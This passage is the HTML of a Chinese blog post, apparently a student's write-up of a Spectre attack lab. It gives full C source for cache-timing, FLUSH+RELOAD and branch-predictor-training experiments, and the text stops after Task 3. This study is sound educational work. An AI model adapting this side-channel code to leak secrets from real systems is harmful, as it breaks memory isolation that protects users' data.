@@ -1,0 +1,680 @@
+
+
+<!DOCTYPE html>
+<html lang="zn-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="实验题目 幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lab12-幽灵攻击">
+<meta property="og:url" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Bubble&#39;s Blog">
+<meta property="og:description" content="实验题目 幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，">
+<meta property="og:locale" content="zn_CN">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.0.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.9.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.10.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.12.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.13.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.14.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.15.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.16.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.17.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.18.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.19.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.20.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.21.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.22.jpg">
+<meta property="og:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.23.jpg">
+<meta property="article:published_time" content="2024-02-20T13:55:34.584Z">
+<meta property="article:modified_time" content="2024-02-21T08:45:58.335Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ybubble.github.io/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.0.jpg">
+  
+  
+  
+  <title>Lab12-幽灵攻击 - Bubble&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ybubble.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Bubble</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Category</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/3.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Lab12-幽灵攻击"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-20 21:55" pubdate>
+          February 20, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Lab12-幽灵攻击</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>实验题目</h1>
+<p>幽灵攻击于2017年发现，并于2018年1月公开披露，它利用关键漏洞进行攻击，存在于许多现代处理器中，包括Intel、AMD和ARM处理器。漏洞允许程序突破进程间和进程内的隔离，以便恶意程序可以读取来自无法访问区域的数据。硬件保护不允许这样的访问机制（用于进程间的隔离）或软件保护机制（用于进程内的隔离），但CPU设计中存在漏洞，可能会破坏保护。因为缺陷存在于硬件中，很难从根本上解决问题，除非更换CPU。幽灵和熔断漏洞代表了CPU设计中的一种特殊类型的漏洞，它们还为安全教育提供了宝贵的一课。</p>
+<p>本实验的学习目标是让学生获得幽灵攻击的第一手经验。攻击本身非常复杂，因此我们将其分解为几个小步骤，每个步骤都是易于理解和执行。一旦学生理解了每一步，就不难理解了把所有的东西放在一起进行实际的攻击。本实验涵盖了以下内容:幽灵攻击、侧通道攻击、CPU缓存、CPU微体系结构内的无序执行和分支预测</p>
+<h1>实验步骤及结果</h1>
+<h2 id="Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches">Tasks 1 and 2: Side Channel Attacks via CPU Caches</h2>
+<h3 id="Task-1-Reading-from-Cache-versus-from-Memory">Task 1: Reading from Cache versus from Memory</h3>
+<p>task1可以让我们观察到从cache读和内存读差别。在CacheTime.c中有一个大小为10*4096的数组，首先访问该数组的两个元素：array[3*4096]和array[7*4096]，这两个元素会被缓存。接着从array[0*4096]读到array[9*4096]，并计算对应的读取时间。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.0.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><code>CacheTime.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">10</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Initialize the array</span><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>]=<span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">// FLUSH the array from the CPU cache</span><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>]);<br><br>  <span class="hljs-comment">// Access some of the array items</span><br>  <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>*<span class="hljs-number">4096</span>] = <span class="hljs-number">100</span>;<br>  <span class="hljs-built_in">array</span>[<span class="hljs-number">7</span>*<span class="hljs-number">4096</span>] = <span class="hljs-number">200</span>;<br><br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span>];<br>    time1 = __rdtscp(&amp;junk);                <br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;       <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Access time for array[%d*4096]: %d CPU cycles\n&quot;</span>,i, (<span class="hljs-type">int</span>)time2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>1、编译，march标志告诉编译器启用本地机器支持的所有指令子集。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native CacheTime.c<br></code></pre></td></tr></table></figure>
+<p>2、运行</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure>
+<p>多次运行程序，其中4次运行结果如下，通过运行结果来看，大部分情况下，读取array[3*4096]和array[7*4096]的速度明显比读取其他元素的速度要快。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="Task-2-Using-Cache-as-a-Side-Channel">Task 2: Using Cache as a Side Channel</h3>
+<p>task2实现的是使用side channel来获取受害函数的秘密值，使用的方法为FLUSH+RELOAD。实现过程如图：</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.9.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>（1）从缓存内存中刷新整个阵列，以确保该阵列没有被缓存。</p>
+<p>（2）调用受害者函数，该函数基于秘密的值访问其中一个数组元素，这将导致缓存相应的数组元素。</p>
+<p>（3）重新加载整个数组，并计算重新加载每个元素所需的时间。如果某个特定元素的加载时间较快，则很可能该元素已经在缓存中，那么这个元素很可能是受害者函数所访问的元素。在代码中这个阈值被设置为150。</p>
+<p><code>FlushReload.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-type">int</span> temp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> secret = <span class="hljs-number">94</span>;<br><br><span class="hljs-comment">/* cache hit time threshold assumed*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (150)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">()</span><br>&#123;<br>  temp = <span class="hljs-built_in">array</span>[secret*<span class="hljs-number">4096</span> + DELTA];<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span> <br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>     addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>     time1 = __rdtscp(&amp;junk);<br>     junk = *addr;<br>     time2 = __rdtscp(&amp;junk) - time1;<br>     <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>,i,DELTA);<br>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>,i);<br>     &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>  flushSideChannel();<br>  victim();<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>程序设定了一个阈值，当时间小于这个阈值，说明被CPU缓存了，这时这个值肯定是调用victim函数的那个值，可以把该值读取出来。</li>
+<li>乘4096只是为了把cache块隔开，4096大于一个典型的64字节的内存块</li>
+<li>由于缓存是块级缓存的，故不能简单定义array[256]</li>
+<li>由于数组[0*4096]可能与相邻内存中的变量属于同一缓存块，因此可能由于缓存而意外缓存。</li>
+</ul>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o FlushReload FlushReload.c<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.10.jpg" srcset="/img/loading.gif" lazyload class="">
+<blockquote>
+<p>:exclamation:Q</p>
+<p>1、为什么要循环256次</p>
+<p>要取的秘密值是一个字节，一个字节8位，一位不是0就是1，2的8次方是256，一共有256种可能</p>
+<p>2、为什么要加delta</p>
+<p>由于array[0*4096]可能会和其他变量使用同一个内存块，会因变量而缓存起来，为了避免这种情况同时保持程序一致性， 在所有数组上都加一个偏移</p>
+</blockquote>
+<h2 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction">Task 3: Out-of-Order Execution and Branch Prediction</h2>
+<p><code>SpectreExperiment.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (150)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-type">int</span> size = <span class="hljs-number">10</span>;<br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><span class="hljs-type">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d.\n&quot;</span>, i);<br>    &#125;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">victim</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; size) &#123;  <br>      temp = <span class="hljs-built_in">array</span>[x * <span class="hljs-number">4096</span> + DELTA];  <br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-comment">// FLUSH the probing array</span><br>  flushSideChannel();<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim()</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;   <br>      victim(i);<br>  &#125;<br><br>  <span class="hljs-comment">// Exploit the out-of-order execution</span><br>  _mm_clflush(&amp;size);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>      _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); <br>  victim(<span class="hljs-number">97</span>);  <br><br>  <span class="hljs-comment">// RELOAD the probing array</span><br>  reloadSideChannel();<br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>1、编译运行SpectreExperiment.c，得到Secret值。</p>
